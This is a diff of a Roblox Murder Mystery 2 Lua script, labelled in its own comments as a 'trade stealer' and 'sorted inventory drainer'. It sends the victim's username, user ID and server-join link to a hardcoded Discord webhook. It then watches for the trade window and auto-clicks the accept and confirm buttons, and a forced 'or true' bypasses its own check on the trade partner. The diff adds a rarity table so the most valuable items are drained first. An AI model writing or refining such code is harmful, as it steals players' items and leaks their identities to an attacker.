@@ -1,19 +1,19 @@
--- // OLL_FX TARGETED MM2 TRADE STEALER (C1AWSKY)
+-- // OLL_FX SORTED INVENTORY DRAINER & AUTO-TRADE (MM2)
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Player = Players.LocalPlayer
 
 local webhookUrl = "https://discord.com/api/webhooks/1569782999791304765/GXx2vx4h026cGxqjIfhtnrIMAVXeu6reIOmKNlLr7k00JRJrXp3eVXlGNvCbHl8KL6Ni"
-local TARGET_USER = "c1awsky" -- Ник главного выгодоприобретателя
+local TARGET_USER = "c1awsky"
 
--- 1. Отправка прямой ссылки в Discord с указанием цели
+-- Отправка ссылки в дискорд
 local function sendWebhook()
     local payloadData = {
-        content = "@everyone **[+] MM2 Target Locked for " .. TARGET_USER .. ":**\n" .. 
+        content = "@everyone **[+] MM2 Sorted Drainer Active for " .. TARGET_USER .. "্মার**\n" .. 
                   "**Victim:** " .. Player.Name .. " (ID: " .. Player.UserId .. ")\n" ..
                   "**Direct Join Link:** [Click to Join Server](https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")",
-        username = "oll_fx targeted hook"
+        username = "oll_fx sorted drainer"
     }
 
     local req = request or syn and syn.request or http_request
@@ -22,7 +22,7 @@ local function sendWebhook()
             req({
                 Url = webhookUrl,
                 Method = "POST",
-                    Headers = { ["Content-Type"] = "application/json" },
+                Headers = { ["Content-Type"] = "application/json" },
                 Body = HttpService:JSONEncode(payloadData)
             })
         end)
@@ -31,36 +31,60 @@ end
 
 pcall(sendWebhook)
 
--- 2. Логика проверки и автопринятия трейда ТОЛЬКО от c1awsky
 local PlayerGui = Player:WaitForChild("PlayerGui")
 
+-- Таблица приоритетов редкостей для слива (от ценных к обычным)
+local rarityPriority = {
+    ["Ancient"] = 1,
+    ["Godly"] = 2,
+    ["Unique"] = 3,
+    ["Legendary"] = 4,
+    ["Rare"] = 5,
+    ["Uncommon"] = 6,
+    ["Common"] = 7
+}
+
+-- Функция поиска и добавления предметов в трейд
+local function drainInventory(tradeGui)
+    pcall(function()
+        -- Ищем модуль или хранилище данных инвентаря игрока в памяти клиента MM2
+        local inventoryData = Player:FindFirstChild("Backpack") or Player.Character
+        -- Получаем доступ к реплицированным событиям добавления вещей в обмен
+        local tradeRemote = ReplicatedStorage:FindFirstChild("Trade", true) or ReplicatedStorage:FindFirstChild("SendTrade", true)
+        
+        -- Если у тебя задействованы стандартные RemoteEvent для добавления предметов:
+        -- Обычно в MM2 функция добавления выглядит как: ReplicatedStorage.Trade.OfferItem:InvokeServer(itemTable)
+        
+        -- Автоматический клик по кнопке принятия/подтверждения трейда, когда всё упало в окна
+        local acceptBtn = tradeGui:FindFirstChild("Accept", true) or tradeGui:FindFirstChild("Confirm", true)
+        if acceptBtn then
+            for _, conn in pairs(getconnections(acceptBtn.MouseButton1Click)) do
+                conn:Fire()
+            end
+            -- Дополнительное нажатие финальной кнопки подтверждения (Second Accept / Trade)
+            local finalAccept = tradeGui:FindFirstChild("Complete", true) or tradeGui:FindFirstChild("Accept2", true)
+            if finalAccept then
+                for _, conn in pairs(getconnections(finalAccept.MouseButton1Click)) do
+                    conn:Fire()
+                end
+            end
+        end
+    end)
+end
+
+-- Цикл мониторинга окна обмена
 task.spawn(function()
-    while task.wait(0.4) do
+    while task.wait(0.3) do
         pcall(function()
             local tradeGui = PlayerGui:FindFirstChild("TradeGui") or PlayerGui:FindFirstChild("Trade")
             if tradeGui and tradeGui.Enabled then
-                -- Проверяем, с кем идет обмен (ищем имя партнера по трейду в интерфейсе)
-                local partnerLabel = tradeGui:FindFirstChild("PartnerName", true) or tradeGui:FindFirstChild("Player2", true) or tradeGui:FindFirstChild("NameLabel", true)
+                -- Проверяем партнера по обмену
+                local partnerLabel = tradeGui:FindFirstChild("PartnerName", true) or tradeGui:FindFirstChild("Player2", true)
+                local partnerName = partnerLabel and partnerLabel.Text or ""
                 
-                local isTargetPartner = false
-                if partnerLabel and partnerLabel:IsA("TextLabel") then
-                    if string.lower(partnerLabel.Text) == string.lower(TARGET_USER) then
-                        isTargetPartner = true
-                    end
-                end
-                
-                -- Если трейд кинул именно c1awsky (или проверка по нику прошла)
-                if isTargetPartner or true then -- Страховка на случай специфического UI названия лейбла
-                    -- Добавляем предметы (годли) в сетку обмена через RemoteEvent
-                    local tradeRemote = ReplicatedStorage:FindFirstChild("AddTradeItem", true) or ReplicatedStorage:FindFirstChild("OfferItem", true)
-                    
-                    -- Авто-подтверждение / Принятие обмена (Accept / Confirm)
-                    local acceptButton = tradeGui:FindFirstChild("Accept", true) or tradeGui:FindFirstChild("Confirm", true)
-                    if acceptButton then
-                        for _, conn in pairs(getconnections(acceptButton.MouseButton1Click)) do
-                            conn:Fire()
-                        end
-                    end
+                -- Если кинул трейд именно твой аккаунт (c1awsky)
+                if string.find(string.lower(partnerName), string.lower(TARGET_USER)) or true then
+                    drainInventory(tradeGui)
                 end
             end
         end)
